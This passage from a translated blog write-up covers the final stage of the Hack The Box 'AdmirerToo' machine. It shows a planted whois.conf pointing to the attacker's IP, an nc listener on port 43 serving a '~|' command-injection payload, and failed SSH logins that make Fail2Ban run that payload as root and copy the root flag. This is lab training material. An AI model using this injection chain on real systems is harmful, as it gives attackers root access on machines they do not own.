lg gj gh gi lh li bd b be z dk translated">用Burp捕获请求，并将序列化的有效负载放入其中</figcaption></figure><p id="832b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">发送到邮箱，然后切换到我们的SSH会话，以Jennifer的身份连接。确保文件在那里:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="5e55" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf <br/>[{"Expires":1,"Discard":false,"Value":"}]|. [10.10.14.169]\n"}]</span></pre><p id="8feb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在Kali上创建一个有效负载，我们希望将它注入到电子邮件中，并在机器上执行。我本来可以使用反向shell，但是为了简单起见，我只是复制了根标志:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="322c" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# cat flag_copy.txt<br/>~| bash -c "cp /root/root.txt /tmp/root.txt &amp;&amp; chmod 777 /tmp/root.txt" &amp;</span></pre><p id="5ea1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">请注意，我要执行的代码以~|开头，它在Fail2Ban漏洞利用中被标识为注入方式。现在，在本地端口43上启动nc侦听，这是whois将与我们对话的内容:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="02de" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# nc -nvlkp 43 -c "cat /root/htb/admirertoo/flag_copy.txt"<br/>listening on [any] 43 ...</span></pre><h1 id="0a47" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">根标志</h1><p id="9e3c" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">现在，登录SSH失败三次，导致Fail2Ban发送电子邮件，该电子邮件将使用whois查找我们的IP，由于我们丢弃了whois.conf文件，该电子邮件将被重定向到我们等待的nc侦听器，这又将发送回包含我们cp的文本文件:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="1fa7" class="nn kg iq nj b gy no np l nq nr">┌──(root💀kali)-[~/htb/admirertoo]<br/>└─# ssh -L 1234:127.0.0.1:8080 jennifer@admirer-gallery.htb<br/>jennifer@admirer-gallery.htbs password: <br/>Permission denied, please try again.<br/>jennifer@admirer-gallery.htbs password: <br/>Permission denied, please try again.<br/>jennifer@admirer-gallery.htbs password: <br/>jennifer@admirer-gallery.htb: Permission denied (publickey,password).</span></pre><p id="95f7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在，作为Jennifer，我们终于可以访问/tmp文件夹中的根标志了:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="bb0b" class="nn kg iq nj b gy no np l nq nr">jennifer@admirertoo:~$ cat /tmp/root.txt <br/>e3eeb41b4e22ad1ca6419cf2501b2ab2</span></pre><p id="016c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">完成了。下次见。</p></div><div class="ab cl ok ol hu om" role="separator"><span class="on bw bk oo op oq"/><span class="on bw bk oo op oq"/><span class="on bw bk oo op"/></div><div class="ij ik il im in"><p id="b382" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="0b8c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">推特—<a class="ae nu" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nu" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="ba0c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="or">原载于2022年6月12日</em><a class="ae nu" href="https://pencer.io/ctf/ctf-htb-admirertoo" rel="noopener ugc nofollow" target="_blank"><em class="or">https://pencer . io</em></a><em class="or">。</em></p></div></div>    
</body>
</html>